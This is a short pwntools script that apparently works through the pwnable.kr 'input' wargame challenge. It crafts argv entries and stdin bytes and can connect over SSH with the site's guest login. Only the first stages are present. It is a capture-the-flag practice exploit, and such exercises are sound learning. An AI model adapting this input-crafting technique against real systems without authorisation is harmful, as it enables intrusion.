from pwn import *
context.log_level = 'debug'

argvs=['input']

for i in range(1,100):
	argvs.append('0')

argvs[65] = "\x00"
argvs[66] = "\x20\x0a\x0d"

rr = 0
if rr:
	con = ssh(host='pwnable.kr',user='input2',password='guest',port=2222)
	cn = con.process(argv=argvs,executable="./input")
else:
	cn = process(argv=argvs,executable="./input")

cn.recv()
cn.send('\x00\x0a\x00\xff')
cn.send("\x00\x0a\x02\xff")
cn.recv()